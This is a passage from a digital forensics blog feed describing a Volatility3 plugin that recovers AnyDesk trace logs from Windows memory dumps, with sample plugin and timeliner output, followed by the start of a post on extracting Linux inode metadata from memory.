plain">   </span><span class="token number">19</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">21</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.287       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">                        handshake - Using protocol version </span><span class="token number">1</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.287       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">            anynet.connection_mgr - </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:49152</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Direct connection.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see that it is possible to extract useful artifacts.
Hereby is a non-exhaustive list:</p>
<ul>
<li>AnyDesk version</li>
<li>The IP address of the AnyDesk relay used when initiating a connection</li>
<li>Timestamps of each action</li>
<li>Listening port</li>
<li>Incoming connection IP address</li>
<li>Involved PIDs</li>
<li>Number of monitors found</li>
<li>Install date</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-anti-forensics-scenario">The anti-forensics scenario<a href="https://forensicxlab.github.io/blog/anydesk#the-anti-forensics-scenario" class="hash-link" aria-label="Direct link to The anti-forensics scenario" title="Direct link to The anti-forensics scenario">‚Äã</a></h2>
<p>If the adversary is aware of those artifacts, he might delete those files. However, there is still a chance to retrieve those cached files in memory!
In this example, our is setup is 2 windows 10 virtual machine (<strong>A</strong> and <strong>B</strong>). <strong>A</strong> (attacker) is initiating a remote anydesk connection to <strong>B</strong> (victim).
After a while the session is disconnected and A deleted the ad.trace and ad_svc.trace files.
Next, a memory dump of machine <strong>B</strong> is performed, ready to be analyzed.</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/scenario-9761799e8d300f51d09bbbf7ad5e290a.png" title="Investigation scenario" width="1829" height="1007" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="writing-a-volatility3-plugin">Writing a Volatility3 plugin<a href="https://forensicxlab.github.io/blog/anydesk#writing-a-volatility3-plugin" class="hash-link" aria-label="Direct link to Writing a Volatility3 plugin" title="Direct link to Writing a Volatility3 plugin">‚Äã</a></h2>
<p>Using volatility3<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-5-026302" id="user-content-fnref-5-026302" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup> we can write a custom plugin which will perform the following steps :</p>
<ul>
<li>Look for ad.trace and ad_svc.trace using the filescan plugin;</li>
<li>Try to dump the files if found;</li>
<li>Parse the files and render the data to the investigator.</li>
</ul>
<p>Indeed, we could just dump the file and analyze it offline. However, writing a dedicated plugin is useful to:</p>
<ul>
<li>Interface with the Timeliner plugin and make timestamps correlation with other artifacts;</li>
<li>Interface with any other tools that are exploiting the other volatility3 output capabilities (json, csv, ...).</li>
</ul>
<p><em><strong>Plugin output example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/Memory Analysis/MemoryImages/Windows10_AnyDesk ¬ª vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> Windows_AD.vmem anydesk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.0</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  </span><span class="token number">100.00</span><span class="token plain">		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Source	Type	Time	Context	Message</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.854000 	gsvc	Main relay connection established.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.854000 	gsvc	New user data. Client-ID: </span><span class="token number">684537884</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	error	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:14:32.954000 	gsvc	packet-type</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">60</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	Spawning root fiber </span><span class="token number">37</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:52257</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Incoming connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.766000 	gsvc	Spawning root fiber </span><span class="token number">38</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	Spawning root fiber </span><span class="token number">39</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	Using protocol version </span><span class="token number">1</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.867000 	gsvc	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:52257</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Direct connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ProgramData</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ad_svc.trace	info	</span><span class="token number">2022</span><span class="token plain">-09-30 </span><span class="token number">19</span><span class="token plain">:37:36.926000 	gsvc	Backend PID: </span><span class="token number">1268</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><em><strong>Using the timeliner plugin</strong></em></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Fiber 20 terminated.  	2022-09-27 15:30:21.968000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info line: "C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe" --install "C:\Program Files (x86)\AnyDesk"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf "C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf"  --sys-conf "C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf"  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Starting installation of AnyDesk.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info Opening UAC dialog.  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info line: "C:\Users\Volatility\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\AnyDesk (1).exe" --install "C:\Program Files (x86)\AnyDesk"  --start-with-win --create-shortcuts --create-taskbar-icon --create-desktop-icon --install-driver:mirror --install-driver:printer --update-disabled --svc-conf "C:\Users\Volatility\AppData\Roaming\AnyDesk\service.conf"  --sys-conf "C:\Users\Volatility\AppData\Roaming\AnyDesk\system.conf"  	2022-09-27 15:30:35.484000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SymlinkScan	Symlink: Global -&gt; \BaseNamedObjects	2022-09-27 15:30:37.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded rsaenh.dll (C:\Windows\system32\rsaenh.dll) Size 208896 Offset 140735643516928	2022-09-27 15:30:40.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded CRYPTBASE.dll (C:\Windows\System32\CRYPTBASE.dll) Size 49152 Offset 140735649873920	2022-09-27 15:30:40.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 3680 explorer.exe Loaded LINKINFO.dll (C:\Windows\SYSTEM32\LINKINFO.dll) Size 53248 Offset 140735555567616	2022-09-27 15:30:41.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsList	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PsScan	Process: 9068 AnyDesk.exe (221603241440448)	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 380 svchost.exe Loaded SHELL32.dll (C:\Windows\System32\SHELL32.dll) Size 21954560 Offset 140735700271104	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 3680 explorer.exe Loaded EhStorShell.dll (C:\Windows\System32\EhStorShell.dll) Size 225280 Offset 140735394414592	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded AnyDesk.exe (C:\Program Files (x86)\AnyDesk\AnyDesk.exe) Size 16338944 Offset 19005440	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded &lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt; (&lt;volatility3.framework.renderers.UnreadableValue object at 0x1464d7520&gt;) Size 2019328 Offset 140735723339776	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64.dll (C:\Windows\System32\wow64.dll) Size 339968 Offset 140735698370560	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64win.dll (C:\Windows\System32\wow64win.dll) Size 507904 Offset 140735699550208	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">DllList	DLL Load: Process 9068 AnyDesk.exe Loaded wow64cpu.dll (C:\Windows\System32\wow64cpu.dll) Size 36864 Offset 2002452480	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NetScan	Network connection: Process 9068 AnyDesk.exe Local Address 0.0.0.0:7070 Remote Address 0.0.0.0:0 State LISTENING Protocol TCPv4 	2022-09-27 15:30:42.000000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * AnyDesk Windows Startup *  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Version 7.0.14 (release/win_7.0.x 5cf8483107cd52198359a9504e0641fbe8cc59b3)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Custom Client (no ID)  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Anydesk	AnyDesk: info * Checksum 1b8e6bc34e8cd533b5d7281935ff2761  	2022-09-27 15:30:42.636000 	N/A	N/A	N/A</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/anydesk#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>This plugin was tested on Windows 10 memory dumps and the code can be found on the forensicxlab github : <a href="https://github.com/forensicxlab/volatility3_plugins" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3_plugins</a>.
I would like to thank @DebugPrivilege for the tweet<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-6-026302" id="user-content-fnref-6-026302" data-footnote-ref="true" aria-describedby="footnote-label">6</a></sup> he made about the subject that gave me the idea to write this plugin.</p>
<p>AnyDesk is only one of the techniques used by threat actors to establish persistence via remote access. It is possible that other posts of the same type dealing with RA tools like "Atera" will come out in a few weeks.</p>
<p>It will be submitted to the volatility3 foundation for integration to the framework. You should Identify each steps described before in the source code comments.
Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a>, or to make a pull-request on the repository to enhance this plugin or this article.</p>
<p>Happy Hunting!</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/anydesk#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-026302">
<p><a href="https://anydesk.com/en" target="_blank" rel="noopener noreferrer">https://anydesk.com/en</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-1-026302" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-026302">
<p><a href="https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/" target="_blank" rel="noopener noreferrer">https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-2-026302" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-026302">
<p><a href="https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba" target="_blank" rel="noopener noreferrer">https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-3-026302" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-4-026302">
<p><a href="https://support.anydesk.com/knowledge/trace-files" target="_blank" rel="noopener noreferrer">https://support.anydesk.com/knowledge/trace-files</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-4-026302" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-5-026302">
<p><a href="https://volatility3.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/latest/index.html</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-5-026302" data-footnote-backref="" aria-label="Back to reference 5" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-6-026302">
<p><a href="https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ" target="_blank" rel="noopener noreferrer">https://twitter.com/debugprivilege/status/1574435608713658368?s=21&amp;t=PWI9kJEpzECxhbyNFR8YUQ</a> <a href="https://forensicxlab.github.io/blog/anydesk#user-content-fnref-6-026302" data-footnote-backref="" aria-label="Back to reference 6" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>Anydesk</category>
            <category>Windows</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 Linux Plugin - Inodes]]></title>
            <link>https://forensicxlab.github.io/blog/inodes</link>
            <guid>https://forensicxlab.github.io/blog/inodes</guid>
            <pubDate>Wed, 14 Sep 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[The filesystem is one of the most basic and important concepts in UNIX/Linux. This concept is working around the idea that ‚Äúeverything is a file‚Äù, meaning that the hardware, regular files, directories, sockets, kernel data structures, process communications etc are represented as files with their own types. On a filesystem, a file (whatever its type) is assigned with a number called an "inode". An inode is an interface between the blocks on the filesystem and the file.]]></description>
            <content:encoded><![CDATA[<p>The filesystem is one of the most basic and important concepts in UNIX/Linux. This concept is working around the idea that ‚Äúeverything is a file‚Äù, meaning that the hardware, regular files, directories, sockets, kernel data structures, process communications etc are represented as files with their own types. On a filesystem, a file (whatever its type) is assigned with a number called an "<strong>inode</strong>". An inode is an interface between the blocks on the filesystem and the file.</p>
<p>When a process is running, it is interacting with the hardware, the kernel, the user‚Äôs resources etc, therefore opening the required files. Linux is keeping track of the opened files inodes in memory by using the <strong>Virtual File System</strong> (VFS) and more precisely the <strong>directory entry cache</strong> (dentry). In this article, I will present how you can extract inode metadata from a modern Linux memory image using the volatility3 framework.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="linux-memory-analysis">Linux memory analysis<a href="https://forensicxlab.github.io/blog/inodes#linux-memory-analysis" class="hash-link" aria-label="Direct link to Linux memory analysis" title="Direct link to Linux memory analysis">‚Äã</a></h2>
<p>When performing memory forensics on a Linux memory image, the fact that a lot of distribution exist is making the memory analysis with volatility3 trickier. Volatility3 is basically trying to identify known structures in memory to create python objects that can be exploited. The framework needs <strong>symbol tables</strong> to be able to know where to find these structures and how they are defined. For example, to identify the structures inside a x64 Intel based Linux Debian machine memory dump, you'll need:</p>
<ul>
<li>To find the kernel debugging symbols generated at compilation time matching the kernel version.</li>
<li>Convert the debugging symbols into symbol tables understandable by volatility3.</li>
<li>Work with the framework to identify and extract structures from memory and get your artifacts.</li>
</ul>
<p>You can learn more about theses steps here : <a href="https://volatility3.readthedocs.io/en/latest/symbol-tables.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/latest/symbol-tables.html</a></p>
<p>This process is easier for Windows and Mac because there is "one distribution" per OS. However, the fact that a lot of distributions for Linux exists makes this task more difficult.</p>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/KDS-3cca088e2c3199a6ab06592d2d635712.png" title="Kernel Debugging Symbols" width="3049" height="1357" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="inode-forensics-value-in-memory">Inode forensics value in memory<a href="https://forensicxlab.github.io/blog/inodes#inode-forensics-value-in-memory" class="hash-link" aria-label="Direct link to Inode forensics value in memory" title="Direct link to Inode forensics value in memory">‚Äã</a></h2>
<p>If you have ever performed digital forensic on a post-mortem Linux investigation, you may know that the inode structure on disk varies depending on the type of filesystem used. For example, Debian is by default using <strong>ext4</strong> filesystem whereas Fedora is using <strong>XFS</strong> and CentOS is using <strong>btrfs</strong>.</p>
<p>However, the fact that we are performing our analysis in memory, we are talking about extracting inode objects contained in the <strong>directory entry cache</strong> (dentry) from the <strong>Virtual File System</strong> (VFS). The VFS is an abstraction of the filesystem within the kernel which allows coexistence between the different type encountered. The fact that dentries are living in RAM and are never saved to the disk is giving us new useful forensics artifacts that may not be found on a classic ‚Äúdead system‚Äù.</p>
<p>When a process is opening files, it is storing a list of file descriptors. Each file descriptor (fd) is a pointer to a structure containing the dentry cache. We can extract the file inode from this structure and get access to its metadata which are very useful forensics artifacts. We can retrieve the following:</p>
<ul>
<li>File size in bytes (i_size)</li>
<li>File permissions (i_mode)</li>
<li>Last modification time (mtime)</li>
<li>Last changed time (ctime)</li>
<li>Last access time (atime)</li>
</ul>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/dentry-aabea27f6ed98d62e9149bddbba10ca0.png" title="How to get the dentry" width="2064" height="678" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-volatility3-inode-plugin">The Volatility3 inode plugin<a href="https://forensicxlab.github.io/blog/inodes#the-volatility3-inode-plugin" class="hash-link" aria-label="Direct link to The Volatility3 inode plugin" title="Direct link to The Volatility3 inode plugin">‚Äã</a></h2>
<p>To be able to extract inode metadata from memory we can identify those major steps:</p>
<ul>
<li>Go through each process using the <strong>pslist</strong> plugin.</li>
<li>For each process, extract the list of file descriptors using code from the <strong>lsof</strong> plugin.</li>
<li>For each file descriptor, extract the cached dentries, parse the inode metadata and return the result.</li>
</ul>
<p>As a result, the plugin is extracting all of the inode metadata needed to help us during our investigation (we like timestamps !).</p>
